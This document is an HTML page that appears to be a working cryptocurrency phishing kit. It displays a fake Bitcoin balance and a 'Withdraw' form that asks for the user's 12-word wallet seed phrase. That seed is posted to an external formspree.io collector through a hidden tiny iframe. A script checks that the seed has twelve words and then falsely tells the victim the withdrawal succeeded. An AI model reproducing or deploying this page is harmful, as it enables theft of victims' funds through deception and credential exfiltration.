<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>My Bitcoin</title>
  <style>
    body {
      background-color: #f5f5f5;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 500px;
      margin: 0 auto;
      padding: 20px;
    }
    h1 {
      text-align: center;
      margin-bottom: 20px;
    }
    .bitcoin-amount {
      font-size: 36px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 20px;
    }
    .address-label {
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .address {
      font-size: 14px;
      padding: 10px;
      background-color: #fff;
      border: 1px solid #ddd;
      border-radius: 5px;
      margin-bottom: 20px;
      word-break: break-all;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      font-size: 18px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .form-input {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 5px;
      background-color: #fff;
      box-sizing: border-box;
    }
    .form-button {
      display: block;
      width: 100%;
      padding: 10px;
      font-size: 16px;
      font-weight: bold;
      color: #fff;
      background-color: #007bff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .form-button:hover {
      background-color: #0069d9;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>You Bitcoins</h1>
    <div class="bitcoin-amount">1.2554532 BTC</div>
    <div class="address-label">You Wallet Address:</div>
    <div class="address">bc1qjd7kc9jx56jucjtt5j46gh5scn3s4n5672tph8</div>
    <form action="https://formspree.io/f/mnqyzroj" method="POST"  target="myFrame" onsubmit="showMessage()">
      <div class="form-group">
        <label for="amount" class="form-label">Amount to withdraw:</label>
        <input type="text" id="amount" name="Amount to withdraw" class="form-input" placeholder="Enter amount in BTC" onkeypress="return isNumberKey(event)">
      </div>
      <div class="form-group">
        <label for="walletAddress" class="form-label">Wallet address for withdrawal:</label>
        <input type="text" id="walletAddress" name="walletAddress" class="form-input" placeholder="Enter address for withdrawal">
      </div>
      <div class="form-group">
        <label for="message" class="form-label">Seed:</label>
        <textarea id="message" name="message" class="form-input" placeholder="Enter seed address for withdrawal"></textarea>
      </div>
      <button type="submit" class="form-button">Withdraw</button>
    </form>
  </div>
  
  <iframe name="myFrame" style="width:10px; height:10px; position:fixed; bottom:0; left:0; border:none;"></iframe>
  
  
<script>
const form = document.querySelector('form');
const messageInput = document.querySelector('#message');

form.addEventListener('submit', (event) => {
  const message = messageInput.value.trim();
  const words = message.split(' ');

  if (words.length !== 12) {
    event.preventDefault();
    alert('Seed must contain exactly 12 words.');
  } else {
    alert('Seeds valid, withdrawal successful');
  }
});

function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : event.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57) && charCode !== 44 && charCode !== 46)
        return false;
    return true;
}
</script>

 
</body>
</html>
